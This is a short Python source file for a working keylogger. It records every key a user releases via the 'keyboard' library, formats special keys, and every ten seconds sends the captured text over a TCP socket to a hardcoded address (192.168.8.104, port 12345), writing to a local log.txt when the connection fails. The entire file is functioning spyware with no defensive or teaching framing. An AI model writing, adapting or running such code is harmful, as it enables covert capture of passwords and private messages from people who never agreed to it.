import keyboard
import smtplib
from threading import Semaphore, Timer
import socket

Host = '192.168.8.104'
port = 12345

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((Host, port))
except:
    print("Unable to connect")

class Keylogger:
    def __init__(self, interval):
        self.interval=interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name)>1:
            if name == "space":
                name =  " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def logger(self):
        try:
            s.sendall(bytes(self.log, "UTF-8"))
        except:
            f = open("log.txt", "a")
            f.write(self.log)
            f.close()

    def report(self):
        if self.log:
            self.logger()
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()

keylogger = Keylogger(interval = 10)
keylogger.start()
